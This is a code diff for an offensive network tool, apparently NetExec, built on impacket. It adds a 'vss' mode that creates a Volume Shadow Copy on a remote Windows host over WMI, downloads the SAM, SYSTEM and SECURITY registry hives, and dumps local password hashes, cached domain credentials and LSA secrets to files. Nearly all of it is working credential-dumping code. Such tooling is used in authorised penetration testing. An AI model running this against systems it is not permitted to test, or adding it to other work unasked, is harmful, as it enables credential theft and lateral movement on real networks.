@@ -7,6 +7,7 @@ import ipaddress
 from Cryptodome.Hash import MD4
 from textwrap import dedent
 
+import tempfile
 from impacket.smbconnection import SMBConnection, SessionError
 from impacket.smb import SMB_DIALECT
 from impacket.examples.secretsdump import (
@@ -14,6 +15,7 @@ from impacket.examples.secretsdump import (
     SAMHashes,
     LSASecrets,
     NTDSHashes,
+    LocalOperations,
 )
 from impacket.examples.regsecrets import (
     RemoteOperations as RegSecretsRemoteOperations,
@@ -1950,7 +1952,6 @@ class smb(connection):
     @requires_admin
     def sam(self):
         try:
-            self.enable_remoteops(regsecret=(self.args.sam == "regdump"))
             host_id = self.db.get_hosts(filter_term=self.host)[0][0]
 
             def add_sam_hash(sam_hash, host_id):
@@ -1967,35 +1968,56 @@ class smb(connection):
 
             add_sam_hash.sam_hashes = 0
 
-            if self.remote_ops and self.bootkey:
-                if self.args.sam == "regdump":
-                    SAM = RegSecretsSAMHashes(
-                        self.bootkey,
-                        remoteOps=self.remote_ops,
-                        perSecretCallback=lambda secret: add_sam_hash(secret, host_id),
-                    )
-                else:
-                    SAM_file_name = self.remote_ops.saveSAM()
-                    SAM = SAMHashes(
-                        SAM_file_name,
-                        self.bootkey,
-                        isRemote=True,
-                        perSecretCallback=lambda secret: add_sam_hash(secret, host_id),
-                    )
-
-                self.logger.display("Dumping SAM hashes")
-                self.output_filename = self.output_file_template.format(output_folder="sam")
-                SAM.dump()
-                SAM.export(self.output_filename)
-                self.logger.success(f"Added {highlight(add_sam_hash.sam_hashes)} SAM hashes to the database")
-
+            if self.args.sam == "vss":
+                self.logger.display("Dumping SAM hashes via VSS shadow copy")
                 try:
-                    self.remote_ops.finish()
-                except Exception as e:
-                    self.logger.debug(f"Error calling remote_ops.finish(): {e}")
+                    with tempfile.TemporaryDirectory() as tmp_dir:
+                        remote_ops = RemoteOperations(self.conn, self.kerberos, self.kdcHost)
+                        sam_path, system_path, security_path = remote_ops.createSSandDownloadWMI("C:\\", tmp_dir)
 
-                if self.args.sam == "secdump":
-                    SAM.finish()
+                        local_ops = LocalOperations(system_path)
+                        bootkey = local_ops.getBootKey()
+
+                        SAM = SAMHashes(sam_path, bootkey, isRemote=False, perSecretCallback=lambda secret: add_sam_hash(secret, host_id))
+                        self.output_filename = self.output_file_template.format(output_folder="sam")
+                        SAM.dump()
+                        SAM.export(self.output_filename)
+                        self.logger.success(f"Added {highlight(add_sam_hash.sam_hashes)} SAM hashes to the database")
+                        SAM.finish()
+                except Exception as e:
+                    self.logger.fail(f"VSS dump failed: {e}")
+            else:
+                self.enable_remoteops(regsecret=(self.args.sam == "regdump"))
+
+                if self.remote_ops and self.bootkey:
+                    if self.args.sam == "regdump":
+                        SAM = RegSecretsSAMHashes(
+                            self.bootkey,
+                            remoteOps=self.remote_ops,
+                            perSecretCallback=lambda secret: add_sam_hash(secret, host_id),
+                        )
+                    else:
+                        SAM_file_name = self.remote_ops.saveSAM()
+                        SAM = SAMHashes(
+                            SAM_file_name,
+                            self.bootkey,
+                            isRemote=True,
+                            perSecretCallback=lambda secret: add_sam_hash(secret, host_id),
+                        )
+
+                    self.logger.display("Dumping SAM hashes")
+                    self.output_filename = self.output_file_template.format(output_folder="sam")
+                    SAM.dump()
+                    SAM.export(self.output_filename)
+                    self.logger.success(f"Added {highlight(add_sam_hash.sam_hashes)} SAM hashes to the database")
+
+                    try:
+                        self.remote_ops.finish()
+                    except Exception as e:
+                        self.logger.debug(f"Error calling remote_ops.finish(): {e}")
+
+                    if self.args.sam == "secdump":
+                        SAM.finish()
         except SessionError as e:
             if "STATUS_ACCESS_DENIED" in e.getErrorString():
                 self.logger.fail('Error "STATUS_ACCESS_DENIED" while dumping SAM. This is likely due to an endpoint protection.')
@@ -2253,8 +2275,6 @@ class smb(connection):
     @requires_admin
     def lsa(self):
         try:
-            self.enable_remoteops(regsecret=(self.args.lsa == "regdump"))
-
             def add_lsa_secret(secret):
                 add_lsa_secret.secrets += 1
                 self.logger.highlight(secret)
@@ -2271,35 +2291,58 @@ class smb(connection):
 
             add_lsa_secret.secrets = 0
 
-            if self.remote_ops and self.bootkey:
-                if self.args.lsa == "regdump":
-                    LSA = RegSecretsLSASecrets(
-                        self.bootkey,
-                        self.remote_ops,
-                        perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret),
-                    )
-                else:
-                    SECURITYFileName = self.remote_ops.saveSECURITY()
-                    LSA = LSASecrets(
-                        SECURITYFileName,
-                        self.bootkey,
-                        self.remote_ops,
-                        isRemote=True,
-                        perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret),
-                    )
-                self.logger.display("Dumping LSA secrets")
-                self.output_filename = self.output_file_template.format(output_folder="lsa")
-                LSA.dumpCachedHashes()
-                LSA.exportCached(self.output_filename)
-                LSA.dumpSecrets()
-                LSA.exportSecrets(self.output_filename)
-                self.logger.success(f"Dumped {highlight(add_lsa_secret.secrets)} LSA secrets to {self.output_filename + '.secrets'} and {self.output_filename + '.cached'}")
+            if self.args.lsa == "vss":
+                self.logger.display("Dumping LSA secrets via VSS shadow copy")
                 try:
-                    self.remote_ops.finish()
+                    with tempfile.TemporaryDirectory() as tmp_dir:
+                        remote_ops = RemoteOperations(self.conn, self.kerberos, self.kdcHost)
+                        sam_path, system_path, security_path = remote_ops.createSSandDownloadWMI("C:\\", tmp_dir)
+
+                        local_ops = LocalOperations(system_path)
+                        bootkey = local_ops.getBootKey()
+
+                        LSA = LSASecrets(security_path, bootkey, None, isRemote=False, perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret))
+                        self.output_filename = self.output_file_template.format(output_folder="lsa")
+                        LSA.dumpCachedHashes()
+                        LSA.exportCached(self.output_filename)
+                        LSA.dumpSecrets()
+                        LSA.exportSecrets(self.output_filename)
+                        self.logger.success(f"Dumped {highlight(add_lsa_secret.secrets)} LSA secrets to {self.output_filename + '.secrets'} and {self.output_filename + '.cached'}")
+                        LSA.finish()
                 except Exception as e:
-                    self.logger.debug(f"Error calling remote_ops.finish(): {e}")
-                if self.args.lsa == "secdump":
-                    LSA.finish()
+                    self.logger.fail(f"VSS dump failed: {e}")
+            else:
+                self.enable_remoteops(regsecret=(self.args.lsa == "regdump"))
+
+                if self.remote_ops and self.bootkey:
+                    if self.args.lsa == "regdump":
+                        LSA = RegSecretsLSASecrets(
+                            self.bootkey,
+                            self.remote_ops,
+                            perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret),
+                        )
+                    else:
+                        SECURITYFileName = self.remote_ops.saveSECURITY()
+                        LSA = LSASecrets(
+                            SECURITYFileName,
+                            self.bootkey,
+                            self.remote_ops,
+                            isRemote=True,
+                            perSecretCallback=lambda secret_type, secret: add_lsa_secret(secret),
+                        )
+                    self.logger.display("Dumping LSA secrets")
+                    self.output_filename = self.output_file_template.format(output_folder="lsa")
+                    LSA.dumpCachedHashes()
+                    LSA.exportCached(self.output_filename)
+                    LSA.dumpSecrets()
+                    LSA.exportSecrets(self.output_filename)
+                    self.logger.success(f"Dumped {highlight(add_lsa_secret.secrets)} LSA secrets to {self.output_filename + '.secrets'} and {self.output_filename + '.cached'}")
+                    try:
+                        self.remote_ops.finish()
+                    except Exception as e:
+                        self.logger.debug(f"Error calling remote_ops.finish(): {e}")
+                    if self.args.lsa == "secdump":
+                        LSA.finish()
         except SessionError as e:
             if "STATUS_ACCESS_DENIED" in e.getErrorString():
                 self.logger.fail('Error "STATUS_ACCESS_DENIED" while dumping LSA. This is likely due to an endpoint protection.')
